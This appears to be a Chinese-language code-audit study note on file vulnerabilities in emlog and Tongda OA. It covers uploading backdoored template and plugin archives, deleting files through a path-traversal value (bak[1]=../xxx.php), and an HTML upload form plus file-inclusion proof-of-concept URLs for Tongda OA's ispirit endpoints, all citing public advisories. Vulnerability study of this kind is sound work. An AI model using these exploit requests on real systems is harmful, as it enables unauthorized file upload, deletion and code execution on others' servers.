# 快速分析脆弱

1. 看文件路径
2. 看代码里面的变量（可控）
3. 看变量前后的过滤

# 文件安全挖掘点

1. 脚本文件名

2. 应用功能点

3. 操作关键字

文件上传，文件下载(读取)，文件包含，文件删除等

# emlog - 文件上传&文件删除

搜索函数关键字或应用关键字：

流程：搜`$_FILES`->**template.php**-> **upload_zip** ->**emUnZip**

流程：搜安装或上传等-> **template.php** -> **upload_zip** -> **emUnZip**

[https://www.cnvd.org.cn/flaw/show/CNVD-2023-74536](https://www.cnvd.org.cn/flaw/show/CNVD-2023-74536)

1. 压缩默认模版目录

2. 压缩一个带后门模版

3. 上传带后门模版压缩包

流程：搜$_FILES->plugin.php->upload_zip->emUnZip

流程：搜安装或上传等->plugin.php->upload_zip->emUnZip

https://www.cnvd.org.cn/flaw/show/CNVD-2023-74535

1、压缩默认插件目录

2、压缩一个带后门插件

3、上传带后门插件压缩包



流程：搜unlink->data.php->action=dell_all_bak->bak[]

https://www.cnvd.org.cn/flaw/show/CNVD-2021-41633

1、`/admin/data.php?action=dell_all_bak`

2、`bak[1]=../xxx.php`

# 通达OA - 文件上传&文件包含 

文件监控：file-jiankong.py

方便监控获取文件上传到什么地方



流程：找文件名->绕验证P->DEST_UID,UPLOAD_MOD->构ATTACHMENT

文件上传(文件名称)：/webroot/ispirit/im/upload.php

1、设置P参数不为0

2、设置`DEST_UID`参数为1

3、设置`UPLOAD_MODE`参数为1,2,3

4、设置上传文件参数名为`ATTACHMENT`

```html
<html>

<body>

<form action="http://127.0.0.1/ispirit/im/upload.php" method="post" enctype="multipart/form-data">

<input type="text"name="P" value=1></input>

<input type="text"name="UPLOAD_MODE" value=1></input>

<input type="text" name="DEST_UID" value=1></input>

<input type="file" name="ATTACHMENT"></input>

<input type="submit" ></input>

</body>

</html>
```

流程：搜`include_once`->gateway.php->`$url`->$key->$json

文件包含(include_once)：`/ispirit/interface/gateway.php`

poc1:

`/ispirit/interface/gateway.php?json={}&url=/general/../../attach/im/2310/1600449966.1.txt`

poc2:

`/ispirit/interface/gateway.php?json={}&url=/ispirit/../../attach/im/2310/1600449966.1.txt`

poc3:

`/ispirit/interface/gateway.php?json={}&url=/module/../../attach/im/2310/1600449966.1.txt`

